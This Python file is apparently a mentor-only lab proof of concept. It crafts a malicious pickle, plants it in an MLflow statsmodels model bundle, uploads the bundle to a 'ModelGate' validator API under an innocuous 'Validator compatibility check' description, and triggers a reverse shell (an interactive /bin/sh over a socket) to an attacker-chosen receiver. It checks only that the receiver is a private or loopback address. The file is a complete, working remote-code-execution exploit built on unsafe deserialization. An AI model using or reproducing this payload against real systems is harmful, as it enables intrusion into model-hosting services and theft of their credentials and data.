"""Mentor-only validator RCE PoC for the isolated lab attacker workstation.

The callback must target a private IPv4 address in the lab VPC. It uses the
same uploaded MLflow statsmodels model path as rce_marker.py, but the pickle
starts a shell with the validator container's own UID and ServiceAccount.
"""

from __future__ import annotations

import argparse
import builtins
import ipaddress
import json
import pickle
import tempfile
import time
import zipfile
from pathlib import Path

import httpx
import mlflow.statsmodels
import numpy as np
import statsmodels.api as sm


LAB_NETWORKS = tuple(
    ipaddress.ip_network(network)
    for network in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8")
)


class ShellPayload:
    def __init__(self, receiver: str, port: int):
        address = ipaddress.IPv4Address(receiver)
        if not any(address in network for network in LAB_NETWORKS):
            raise ValueError("receiver must be a private lab or loopback IPv4 address")
        if not 1024 <= port <= 65535:
            raise ValueError("port must be between 1024 and 65535")
        self.receiver = str(address)
        self.port = port

    def __reduce__(self):
        statement = (
            "import socket, subprocess; "
            f"connection = socket.create_connection(({self.receiver!r}, {self.port}), timeout=10); "
            "connection.settimeout(None); "
            "subprocess.Popen(['/bin/sh', '-i'], stdin=connection, "
            "stdout=connection, stderr=connection, start_new_session=True, "
            "close_fds=True); "
            "connection.close()"
        )
        return builtins.exec, (statement,)


def create_bundle(temp_dir: Path, receiver: str, port: int) -> Path:
    model_path = temp_dir / "model"
    x = sm.add_constant(np.arange(4.0))
    y = 1.0 + np.arange(4.0)
    mlflow.statsmodels.save_model(sm.OLS(y, x).fit(), model_path)
    with (model_path / "model.statsmodels").open("wb") as handle:
        pickle.dump(ShellPayload(receiver, port), handle)

    bundle = temp_dir / "validator-shell-model.zip"
    with zipfile.ZipFile(bundle, "w", zipfile.ZIP_DEFLATED) as archive:
        for path in model_path.rglob("*"):
            if path.is_file():
                archive.write(path, Path("model") / path.relative_to(model_path))
    return bundle


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--modelgate-url", default="http://127.0.0.1:8080")
    parser.add_argument("--receiver", required=True, help="Attacker EC2 private IPv4")
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--timeout", type=float, default=120.0)
    args = parser.parse_args()
    ShellPayload(args.receiver, args.port)
    modelgate_url = args.modelgate_url.rstrip("/")

    with tempfile.TemporaryDirectory(prefix="modelgate-shell-") as temp_dir:
        bundle = create_bundle(Path(temp_dir), args.receiver, args.port)
        with httpx.Client(timeout=60.0) as client:
            upload = client.post(
                f"{modelgate_url}/api/artifacts",
                content=bundle.read_bytes(),
                headers={"content-type": "application/zip"},
            )
            upload.raise_for_status()
            artifact_uri = upload.json()["artifact_uri"]

            create = client.post(
                f"{modelgate_url}/api/models",
                json={
                    "name": f"validator-compat-{int(time.time())}",
                    "artifact_uri": artifact_uri,
                    "description": "Validator compatibility check",
                },
            )
            create.raise_for_status()
            job = create.json()["validation_job"]
            deadline = time.monotonic() + args.timeout
            while job["status"] not in {"succeeded", "failed"}:
                if time.monotonic() >= deadline:
                    raise TimeoutError("validator did not finish before the timeout")
                time.sleep(0.5)
                response = client.get(f"{modelgate_url}/api/jobs/{job['id']}")
                response.raise_for_status()
                job = response.json()

    print(json.dumps({"validation_job": job["id"], "status": job["status"], "error": job.get("error")}))
    if job["status"] != "succeeded":
        raise SystemExit(1)


if __name__ == "__main__":
    main()
